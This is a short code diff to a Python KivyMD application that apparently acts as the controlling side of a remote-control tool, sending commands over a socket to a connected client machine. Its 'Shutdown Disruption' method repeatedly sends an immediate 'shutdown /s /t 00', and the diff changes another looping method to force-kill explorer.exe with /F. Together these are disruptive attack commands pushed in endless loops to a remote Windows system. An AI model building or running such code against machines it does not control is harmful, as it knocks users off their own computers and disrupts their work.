@@ -231,6 +231,7 @@ class Main(MDApp):
     #Shutdown Disruption
     def Shutdown(self):
         while True:
+            #/t is Timer
             command = 'shutdown /s /t 00'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
@@ -239,7 +240,7 @@ class Main(MDApp):
     def KillTask(self):
         while True:
             #procname = input('Enter Process Name: ')
-            command = 'taskkill /im explorer.exe'
+            command = 'taskkill /im explorer.exe /F'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             output = self.currConn.recv(8096).decode()
